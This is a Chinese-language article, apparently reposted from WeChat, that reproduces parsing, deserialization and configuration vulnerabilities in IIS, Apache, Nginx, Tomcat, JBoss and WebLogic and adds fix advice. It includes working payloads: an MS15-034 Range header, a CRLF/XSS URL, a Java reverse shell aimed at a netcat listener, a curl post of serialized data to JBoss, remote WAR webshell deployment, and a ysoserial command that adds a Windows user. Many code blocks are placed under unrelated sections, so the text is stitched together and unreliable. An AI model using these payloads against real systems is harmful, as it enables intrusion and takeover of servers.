<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-Aug3vJRAhznrdzLDXDrMA)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

1.IIS
-----

IIS 是 Internet Information Services 的缩写，意为互联网信息服务，是由微软公司提供的基于运行 Microsoft Windows 的互联网基本服务。最初是 Windows NT 版本的可选包，随后内置在 Windows 2000、Windows XP Professional 和 Windows Server 2003 一起发行，但在 Windows XP Home 版本上并没有 IIS。IIS 是一种 Web（网页）服务组件，其中包括 Web 服务器、FTP 服务器、NNTP 服务器和 SMTP 服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。

IIS 的安全脆弱性曾长时间被业内诟病，一旦 IIS 出现远程执行漏洞威胁将会非常严重。远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码，可以导致 IIS 服务器所在机器蓝屏或读取其内存中的机密数据

### 1.1PUT

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhqFNGcLicicMxqat1Ranm7TF1j3XQ6vzAwicm8q4mXT44jRSrKA8DZtuEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhuVVaJE1JniboRAyBicYz64dHMKo1K84Jagt02pXKDGdG9N9R6FXhjdZA/640?wx_fmt=png)

**修复建议**

关闭 WebDAV 和 “写” 权限

### 1.2 解析漏洞

#### 1.2.1 6.x

**漏洞复现**

该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成 Asp 解析，原理是 服务器默认不解析; 号及其后面的内容，相当于截断。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhAGh3SZADp2SdsG11yIs0N20co01BYBTWvkERXeuiclU5wQ7a5TdRlbg/640?wx_fmt=png)

该版本 默认会将 *.asp / 目录下的所有文件当成 Asp 解析。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhdJGtGwI9Yfco8RCCWnQt0lSgJhxEpVxJ7IJkdibNQmS2uGVgQvJtC9Q/640?wx_fmt=png)

另外，IIS6.x 除了会将扩展名为. asp 的文件解析为 asp 之外，还默认会将扩展名为. asa，.cdx，.cer 解析为 asp，从网站属性 -> 主目录 -> 配置 可以看出，他们都是调用了 asp.dll 进行的解析。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh7xkffBiawPia24fd0JfhUumxGhaEA1eia8ibiaEe7GZqj0o3pqqyga8bKBQ/640?wx_fmt=png)

**修复建议**

由于微软并不认为这是一个漏洞，也没有推出 IIS 6.0 的补丁，因此漏洞需要自己修复。

1.  限制上传目录执行权限，不允许执行脚本。
    

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhxQFcwDibYTpTpUYPk3tuKXmIPopM29uAd2lTUggpBJAdwdbxPNJ9EWw/640?wx_fmt=png)

2.  不允许新建目录。
    
3.  上传的文件需经过重命名 (时间戳 + 随机数 +.jpg 等)
    

#### 1.2.2 7.x

**漏洞复现**

IIS7.x 版本 在 Fast-CGI 运行模式下, 在任意文件，例：test.jpg 后面加上 /.php，会将 test.jpg 解析为 php 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhw7QQnpJ6PshODgdPC285IqBZAs099iaUeFaT6roYJibd7UrVfUuexcJA/640?wx_fmt=png)

**修复建议**

配置 cgi.fix_pathinfo(php.ini 中) 为 0 并重启 php-cgi 程序

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh6vViaA4QAAZdQjMHc1DtCTqWNkoPnaa1IQ4riazLXFcrL14kmC5UORAA/640?wx_fmt=png)

### 1.3 IIS 短文件名

Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 Windows 的程序访问这些文件。在 cmd 下输入 "dir /x" 即可看到短 文件名的效果。

IIS 短文件名产生：

1. 当后缀小于 4 时，短文件名产生需要文件 (夹) 名前缀字符长度大于等于 9 位。

2. 当后缀大于等于 4 时，文件名前缀字符长度即使为 1，也会产生短文件名。

目前 IIS 支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE 六种。IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法被猜测成功。

**漏洞复现**

利用脚本

当访问构造的某个存在的短文件名，会返回 404

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhBway1S6g1mdBBXibxHrym2B6B5ggNtmX4R4uVWRpf4g9vGBoOVoYY8g/640?wx_fmt=png)

当访问构造的某个不存在的短文件名，会返回 400

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhmC2y1RA09he67oQxLZUvlYNLOf5KYAFViaRUyqFOILWJQU9SsKaa2IA/640?wx_fmt=png)

IIS 短文件漏洞局限性

\1) 如果文件名本身太短也是无法猜解的；2) 此漏洞只能确定前 6 个字符，如果后面的字符太长、包含特殊字符，很难猜解；

\3) 如果文件名前 6 位带空格，8.3 格式的短文件名会补进，和真实文件名不匹配；

\4) 如果文件夹名前 6 位字符带点 "."，扫描程序会认为是文件而不是文件夹，最终出现误报；

\5) 不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过 4 个中文字会产生短文件名，但是 IIS 不支持中文猜测。

**修复建议**

1）从 CMD 命令关闭 NTFS 8.3 文件格式的支持

Windows Server 2003：(1 代表关闭，0 代表开启）

关闭该功能：fsutil behavior set disable8dot3 1

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhGh3Y3IHXRYxkibxvib1dib557SkJlmb0E8CyibxpUyics6iaRehDbk09Sw5w/640?wx_fmt=png)

Windows Server 2008 R2：

查询是否开启短文件名功能：fsutil 8dot3name query

关闭该功能：fsutil 8dot3name set 1

不同系统关闭命令稍有区别，该功能默认是开启的.

2）或从修改注册表关闭 NTFS 8.3 文件格式的支持

快捷键 Win+R 打开命令窗口，输入 regedit 打开注册表窗口

找到路径：

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation 这一项的值设为 1，1 代表不创建短文件名格式

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhiccwxILYqOCWwdC5pQNQo8720fcRIcic6ctMBVdpAbBto6nlJLkbMppg/640?wx_fmt=png)

以上两种方式修改完成后，均需要重启系统生效。

Note: 此方法只能禁止 NTFS8.3 格式文件名创建, 已经存在的文件的短文件名无法移除，需要重新复制才会消失。

例: 将 web 文件夹的内容拷贝到另一个位置，如 c:\www 到 c:\ww, 然后删除原文件夹，再重命名 c:\ww 到 c:\www。

### 1.4 **HTTP.SYS** 远程代码执行 **(MS15-034)**

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhEkpAaCnvclQM1WB9lLiaLqoVzkibIZyINicmW6GTMy6OQyzllDonvXDYw/640?wx_fmt=png)

编辑请求头，增加 Range: bytes=0-18446744073709551615 字段，若返回码状态为 416 Requested Range Not Satisfiable，则存在 HTTP.SYS 远程代码执行漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhuJiaQWFyeSSX4CMcia9FeJMpBW8gVVn1wu5lpaWemR3yXficX0XvVwOqw/640?wx_fmt=png)

### 1.5 **CVE-2017-7269**

**适用范围**

在 Windows 2003 R2（Microsoft(R) Windows(R) Server 2003, Enterprise Edition Service Pack 2）上使用 IIS 6.0 并开启 WebDAV 扩展。

**漏洞复现**

CVE 作者给出的 exp 计算机弹弹弹！！！

python2 运行结果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhickdicPDmGRf5Hz4ImqxUyCGcpGJjJXjRt2Vmk6oKbyG6FaX6q7mHldA/640?wx_fmt=png)

**修复建议**

关闭 WebDAV

2.Apache
--------

Apache 是世界使用排名第一的 Web 服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。它快速、可靠并且可通过简单的 API 扩充，将 Perl/Python 等解释器编译到服务器中。

### 2.1 未知扩展名解析漏洞

Apache 的解析漏洞依赖于一个特性：**Apache** 默认一个文件可以有多个以点分割的后缀，当右边的无法识别时（不在 mine.types 文件内），则继续向左识别，直到识别到合法后缀才会解析。

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh4fZxAK7dmSBYMCBeZfde43IALoxLGjHBWp0KwKDibUFC5AibmHpP5XNg/640?wx_fmt=png)

### 2.2 **AddHandler** 导致的解析漏洞

如果运维人员给. php 后缀增加了处理器：AddHandler application/x-httpd-php .php

那么，在有多个后缀的情况下，只要一个文件名中含有. php 后缀，即被识别成 PHP 文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhtHM5szd4LTpsCBlbET4xBOlEHx44z7ayglaeiam8dicxFiblevBv4j3Mg/640?wx_fmt=png)

### 2.3 **Apache HTTPD** 换行解析漏洞（**CVE-2017-15715**）

此漏洞形成的根本原因，在于![](https://mmbiz.qpic.cn/mmbiz_svg/04LrpEqAf4sicUp8PUPFyXyLAnyLWkKYicx2NDmJscYlLGaia37vTDT3wqQ6HvY0nFVryPUnDyTqUA7sfFmtzRapWC7IFqIUPzv/640?wx_fmt=svg)不仅匹配字符串结尾位置，也可以匹配 \ n 或 \r 在解析 PHP 时，1.php\x0A 将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略。

```
http://127.0.0.1/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E
```

**影响版本**

2.4.0~2.4.29

**漏洞复现**

Windows 下

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhsUzj0MelTbDyaHA1YOS8oxgRU6X4ArCc6licdTNkFZR3uWz2E7Kvu2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh4RGaz2ScnicSEsJxDjCaERTVKp7k2V934XCkRueLuI9IzdR9F535e5g/640?wx_fmt=png)

Linux 下

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhNCZtStM0wnD3KQTQicYQ5kBuiajoV702noibAtHgA5ibxDqjufCmAaEvNg/640?wx_fmt=png)

访问查看

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhsDhfPfSgFXymp1jvuINj8rPia6LkwW1GzW4APPjwibqvMFeRstCwIxgA/640?wx_fmt=png)

**修复建议**

\1. 升级到最新版本

\2. 或将上传的文件重命名为为时间戳 + 随机数 +.jpg 的格式并禁用上传文件目录执行脚本权限。

3. **Nginx**
------------

Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。

### 3.1 **Nginx** 配置文件错误导致的解析漏洞

该漏洞其实与 nginx 本身并不相关

```
ReverseShellCommonsCollectionsHashMap，编译并生成序列化数据：生成ReverseShellCommonsCollectionsHashMap.class
```

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhyYtzWaESjgABwxmhypiayKNuJoavCoWAUuAZbkCATJ1PzsrQrJFQTdg/640?wx_fmt=png)

当攻击者访问 / info.jpg/xxx.php 时， Nginx 将查看 URL，看到它以. php 结尾，并将路径传递给 PHP fastcgi 处理程序。Nginx 传给 php 的路径为 c:/WWW/info.jpg/xxx.php, 在 phpinfo 中可以查看_SERVER["ORIG_SCRIPT_FILENAME"] 得到。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhZNaEmBBe3Wiblk94tkjiahQDA3gOSMicpC3yQUqdQEEWnHTjIWtVTx1uA/640?wx_fmt=png)

PHP 根据 URL 映射，在服务器上寻找 xxx.php 文件，但是 xxx.php 不存在，又由于 cgi.fix_pathinfo 默认是开启的，因此 PHP 会继续检查路径中存在的文件，并将多余的部分当作 PATH_INFO。接着 PHP 在文件系统中找到. jpg 文件，而后以 PHP 的形式执行. jpg 的内容，并将 / xxx.php 存储在 PATH_INFO 后丢弃，因此我们在 phpinfo 中的 $_SERVER['PATH_INFO'] 看的到值为空。

**修复建议**

1. 配置 cgi.fix_pathinfo(php.ini 中) 为 0 并重启 php-cgi 程序

2. 如果需要使用到 cgi.fix_pathinfo 这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。

或将上传存储的内容与网站分离，即站库分离。

3. 高版本 PHP 提供了`security.limit_extensions`这个配置参数，设置`security.limit_extensions = .php`

### 3.2 **Nginx** 空字节任意代码执行漏洞

**影响版本**

Nginx 0.5_, 0.6_,0.7 <= 0.7.65,0.8 <= 0.8.37

**漏洞复现**

下创建 info.jpg, 内容为，访问 info.jpg，并抓包，修改为 info.jpg..php，在 Hex 选修卡中将 jpg 后面的.，更改为 00.

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhNiahuLcB9gFLxjicZ7AsasAZqFeos4iaVW2DYdY9RQIwK75zyIfdIMibKA/640?wx_fmt=png)

### 3.3 **Nginx** 文件名逻辑漏洞（**CVE-2013-4547**）

**影响版本**

Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhuibFcibKAicBjwcGEU8H0ayibs4hGgicdA1ldwsLqjDrjzWdOzgUocOicb8g/640?wx_fmt=png)

访问 http://your-ip:8080/uploadfiles/info.jpg, 并抓包，修改为 info.jpg...php, 在 Hex 选修卡中将 jpg 后面的两个点`2e`改成`20,00`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhIOLmUSvBuJQSsHdy7yrdQk6pxQkUwu4ia00t11eZVBVHRKrciadVMlWw/640?wx_fmt=png)

**修复建议**

\1. 设置 security.limit_extensions = .php

\2. 或升级 Nginx

### 3.4 **Nginx** 配置错误导致的安全问题

#### 3.4.1 CRLF

查看 Nginx 文档，可以发现有三个表示 uri 的变量：

1.$uri

2.$document_uri

3.$request_uri

1 和 2 表示的是解码以后的请求路径，不带参数；3 表示的是完整的 URI（没有解码）,Nginx 会将 1，2 进行解码，导致传入 %0a%0d 即可引入换行符，造成 CRLF 注入漏洞。

**漏洞复现**

错误配置：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhqlvYgnJ4RMIOj4icGUUkcp1cL16pdopsWdUDvThOgCvdzR6GALw2lPg/640?wx_fmt=png)

访问：

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
```

将返回包的 Location 端口设置为小于 80，使得浏览器不进行跳转，执行 XSS。  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhY0mGXfiaFGLnlQcDMGESt73JniaHicaw8iaiaFia6nAiav4R27GB51pIoWwpg/640?wx_fmt=png)

结果：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh4pGnpOuN2EMbhzYfRxh0evRuTOM1sFodbrJTyK45AJ5dnblydgic4icg/640?wx_fmt=png)

#### 3.4.2 目录穿越

Nginx 在配置别名（Alias）的时候，如果忘记加 /，将造成一个目录穿越漏洞。错误的配置文件示例（原本的目的是为了让用户访问到 C:/WWW/home / 目录下的文件）：

```
生成 ReverseShellCommonsCollectionsHashMap.ser
```

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhyt8uIWsSksp4hgXibbfNdeT034xvGMjYMXfJtEhoNCbLNKdibtZzIGDA/640?wx_fmt=png)

**修复建议**

只需要保证 location 和 alias 的值都有后缀 / 或都没有 / 这个后缀。

#### 3.4.2 目录遍历

当 Nginx 配置文件中，autoindex 的值为 on 时，将造成一个目录遍历漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhHPohFPgXjdRsaH72Nw2Op1Mkodc3ERwtCF6Vicq3kyk7M86YxMsd0Tg/640?wx_fmt=png)

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhn62UqHHdMdEx9fz70IMJDaIFSFXFDI5Ot1Bw7pHEBjI7GMTOOTgVsw/640?wx_fmt=png)

**修复建议**

将 autoindex 的值置为 off。

4.Tomcat
--------

Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试 JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好 Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上 Tomcat 是 Apache 服务器的扩展，但运行时它是独立运行的，所以当运行 tomcat 时，它实际上作为一个与 Apache 独立的进程单独运行的。

### 4.1 **Tomcat** 任意文件写入（**CVE-2017-12615**）

漏洞本质是 Tomcat 配置文件 / conf/web.xml 配置了可写（readonly=false），导致我们可以往服务器写文件：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhu3q18M5dptNtc91MiaIIOCiauVGjHZXm4MaJmDBRKGoUXsk5sj73Xibqg/640?wx_fmt=png)

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhiarUibkaNZH2Uax6v0eKalcoLkia7ibU597ZEpdasOicdcV8jVOV3BMgU6Q/640?wx_fmt=png)

**修复建议**

将 readonly=true，默认为 true。

### 4.2 **Tomcat** 远程代码执行（**CVE-2019-0232**）

影响访问

均为 Windows 下

9.0.0.M1 ~ 9.0.17

8.5.0 ~ 8.5.39

7.0.0 ~ 7.0.93

**漏洞复现**

修改配置：web.xml

```
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.31.232:6666（ip是nc所在的ip）
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhBsKWdz82icBCNMFnZicMDticar2iawnqw3RaBFDlXzr3VSjqvDTzs5aYxA/640?wx_fmt=png)

content.xml

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhDDCvHHzbdCOicmubIXq5jHm6uHTZytRopf9ah7BnHvMGyydSzdIATGg/640?wx_fmt=png)

在`Tomcat\webapps\ROOT\WEB-INF`新建`cgi`目录，并创建`lxhsec.bat`文件，内容任意。

访问 http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&dir

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhVic6l2Yz7Uhicow8Ooazax7eQuSzfYNLF3qnSXyYOpOB6YLaopnlcgSA/640?wx_fmt=png)

**修复建议**

这个默认是关闭的，如果打开了请关闭，若需使用请升级版本。

### 4.3 **Tomcat +** 弱口令 **&&** 后台 **getshell** 漏洞

tomcat 拿 shell 的常规手段

**漏洞复现**

在`conf/tomcat-users.xml`文件中配置用户的权限：

```
curl http://192.168.31.205:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

正常安装的情况下，tomcat7.0.94 中默认没有任何用户，且 manager 页面只允许本地 IP 访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。

访问`http://127.0.0.1:8080/manager/html`, 输入弱密码 tomcat:tomcat，登陆后台。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh1AwvExYAq9NCibPJ2CS3vPc7EA0GT4CFibx4gzHwTuFUta65smrLN4fA/640?wx_fmt=png)

生成 war 包：

jar -cvf lxhspy.war lxhspy.jsp

部署后，访问`http://127.0.0.1:8080/war包名/包名内文件名`, 如下。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhUu8kiaIwLBgFfT5L93vryyJzqps3tZ15qaTI8DmWLkGUCH9QRia7YYxQ/640?wx_fmt=png)

**修复建议**

\1. 若无必要，取消 manager/html 功能。

\2. 若要使用，manager 页面应只允许本地 IP 访问

5. Jboss
--------

jBoss 是一个基于 J2EE 的开发源代码的应用服务器。JBoss 代码遵循 LGPL 许可，可以在任何商业应用中免费使用。JBoss 是一个管理 EJB 的容器和服务器，支持 EJB1.1、EJB 2.0 和 EJB3 的规范。但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB 容器，一般与 Tomcat 或 Jetty 绑定使用。

### 5.1 **JBoss 5.x/6.x** 反序列化漏洞（**CVE-2017-12149**）

**漏洞复现**

访问`/invoker/readonly`

返回 500，说明页面存在，此页面存在反序列化漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh00v6A5oYovDxqb1KEn43HAGtT3VOiaySxbibpbeuRZP8pbgKD4nSvORw/640?wx_fmt=png)

利用工具: JavaDeserH2HC，我们选择一个 Gadget：

```
http://192.168.31.205:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://192.168.31.205/lxh.war访问http://xx.xx.xx.xx/[warname]/shellname.jsp
```

```
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF\web.xml
```

```
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml
```

```
ysoserial-master\src\main\java\ysoserial\payloads\util\Gadgets.java.
```

利用：

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 "filename:C:\Users\lxhsec\Desktop\TestCode.txt" > result.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhUPJ9C3Dqn1RFNEANlyhZcy9IskbMsD6Nribic11qSbFJjVlrWGRO5Ymg/640?wx_fmt=png)  

### 5.2 **JBoss JMXInvokerServle** 反序列化

**漏洞复现**

访问 `/invoker/JMXInvokerServlet`

返回如下，说明接口开放，此接口存在反序列化漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhrGXUJ2QHavZHuC27xtNHLjokQOERTlp5CnEGUnhPhnzvLywl6U6lBA/640?wx_fmt=png)

这里直接利用 CVE-2017-12149 生成的 ser，发送到`/invoker/JMXInvokerServlet`接口中

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhg6Nswegbz50RkkTiaHjTqPWk8wPogpSjXYCCEpt7ibTRNP4VFwB5cIJw/640?wx_fmt=png)

### 5.3 **JBoss EJBInvokerServlet** 反序列化漏洞

**漏洞复现**

访问`/invoker/EJBInvokerServlet`

返回如下，说明接口开放，此接口存在反序列化漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhGf2qOOL2lJRzN2r0K7xLJicLy0JSh0ibhUftzicu0fMjWfa2u2ticfeL5Q/640?wx_fmt=png)

这里直接利用 CVE-2017-12149 生成的 ser，发送到`/invoker/EJBInvokerServlet`接口中。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhHB6X8glFiciabVQMoZ2l9mgAHG5aBtAzic5fxoUaeOXNKaJYPIdfQibHPA/640?wx_fmt=png)

**修复建议**

有效解决方案：

升级到 JBOSS AS7 版本

临时解决方案：

1）不需要 http-invoker.sar 组件的用户可直接删除此组件；

2）用于对 httpinvoker 组件进行访问控制。

### 5.4 **JBoss <=4.x JBossMQJMS** 反序列化漏洞（**CVE-2017-7504**）

**漏洞复现**

设置外网访问:

在 C:\jboss-4.2.3\server\default\deploy\jboss-web.deployer\server.xml

将 address="${jboss.bind.address} 改为：address="0.0.0.0", 重启 Jboss

```
wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
```

访问`/jbossmq-httpil/HTTPServerILServlet`， 返回 This is the JBossMQ HTTP-IL，说明页面存在，此页面存在反序列化漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhL7ntU0qhiaAqxnAByLW2oSUia0KgGZjUyNruPlgxBtG3rE8zJZGLgP0A/640?wx_fmt=png)

这里直接利用 CVE-2017-12149 生成的 ser，发送到`/jbossmq-httpil/HTTPServerILServlet`接口中。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhIO3RDVqG0hNI6jjes1TELJY64JQm9xFYSHoicgTUTZYDLHCa8xrnN8w/640?wx_fmt=png)

### 5.5 **JMX Console** 未授权访问

JMXConsole 默认存在未授权访问，直接点击 JBoss 主页中的 JMXConsole 链接进入 JMXConsole 页面。

**漏洞复测**

在 JMXConsole 页面点击 jboss.system 链接，在 Jboss.system 页面中点击 service=MainDeployer，如下

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh9tyJqYSPzSApuXaJCE0SOnVbtvwhVZxo1mR9TMygoOicH7lkOwloBIg/640?wx_fmt=png)

进入 service=MainDeployer 页面之后，找到 methodIndex 为 17 or 19 的 deploy 填写远程 war 包地址进行远程部署。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vheutaSd4P6TvsQOic2qT9nicmcyeCCVEY1qAeobbibDxDX0YRiaHTyoO4XQ/640?wx_fmt=png)

这里我部署的 war 包为 lxh.war，链接如下：

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhCicbaC2T7GOBhGWgsnjjjKHgyeSOnzggbd4iciabUlaMwYYCxjeKlAlxA/640?wx_fmt=png)

6. WebLogic
-----------

WebLogic 是美国 Oracle 公司出品的一个 applicationserver，确切的说是一个基于 JAVAEE 架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

### 6.1 XMLDecoder 反序列化漏洞（CVE-2017-10271 & CVE-2017-3506）

Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

**漏洞利用**

访问`/wls-wsat/CoordinatorPortType`，返回如下页面，则可能存在此漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhdBN9ECicpLY0kdQEXFdIic7ngQ006WOESAC1lSknY9icwYdtjybLRicZlQ/640?wx_fmt=png)

漏洞不仅存在于 /wls-wsat/CoordinatorPortType 。

只要是在 wls-wsat 包中的 Uri 皆受到影响，可以查看 web.xml 得知所有受到影响的 Uri，路径为：

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'net user xiaohao xiaohao /add'
```

默认受到影响的 Uri 如下：

```
python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
```

